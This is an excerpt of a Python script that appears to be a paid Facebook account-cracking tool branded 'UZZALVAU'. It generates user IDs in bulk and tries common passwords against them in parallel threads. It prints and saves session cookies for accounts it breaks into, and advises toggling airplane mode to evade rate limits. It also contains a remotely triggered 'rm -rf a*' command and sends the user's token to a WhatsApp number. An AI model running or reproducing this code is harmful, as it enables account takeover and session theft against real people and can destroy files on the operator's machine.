...
\033[38;5;46m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mGITHUB      : \033[1;92mUZZALVAU
\033[38;5;46m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mVERSION     : 2.1
\033[38;5;46m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mTOOLS       : Paid 
\033[38;5;46m———————————————————————————————————"""
...
try:
    ...
    proxy = requests.get('https://github.com/UzzalVau/Your-Pink-Vau/blob/main/Approval.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://github.com/UzzalVau/FCUK-/blob/main/approve.2.txt.git').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://github.com/UzzalVau/FCUK-/blob/main/approve.2.txt.git')
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'hossen','abir1122','abir12','mim123','israt1234']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def UZZAL_UZZAL():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mUZZAL + UZZAL')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'mohammad123','hossain1122','bismilla786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : khan12345,bangladesh,UZZAL,Etc')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[UZZAL] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[UZZAL-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mUZZAL\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/UzzalVau/Your-Pink-Vau/blob/main/Approval.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801843438888?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
